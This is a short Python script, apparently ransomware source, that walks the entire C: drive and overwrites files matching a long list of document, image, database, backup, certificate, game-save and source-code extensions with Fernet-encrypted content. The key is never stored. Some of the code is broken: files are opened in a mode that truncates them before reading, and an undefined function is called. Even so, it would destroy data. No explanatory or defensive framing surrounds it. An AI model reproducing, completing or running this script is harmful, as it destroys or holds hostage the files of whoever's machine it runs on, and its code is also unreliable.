from os import walk
from os import path
from cryptography.fernet import Fernet

# Get base file name
name = path.basename(__file__)

# Creating encryption key
key = Fernet.generate_key()
f = Fernet(key)

# Extensions to encrypt
extensions = [
        ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".sc2save", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb",
        ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".tax",
        ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mcgame", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
        ".menu", ".layout", ".dmp", ".blob", ".esm", ".001", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x",
        ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0",
        ".DayZProfile", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav",
        ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", ".unity3d", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css",
        ".rb", ".png", ".jpeg", ".txt", ".p7c",".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d",
        ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw",
        ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", ".pdd",".psd", ".dbfv", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg",
        ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm",".xlsx", ".xls", ".wps", ".docm", ".docx",
        ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
]

# Scanning entire C drive
for root, dirs, files in walk("C:\\"):
    # Grabbing files
    for file in files:
        fpath = root + "\\" + file
        ext = path.splitext(root + "\\" + file)[1]

        # Encrypting only files with specific extension
        if ext in extensions:
            with open(fpath, "wb+") as of:
                original = of.read()
                encrypted = encrypted(original)

                of.write(encrypted)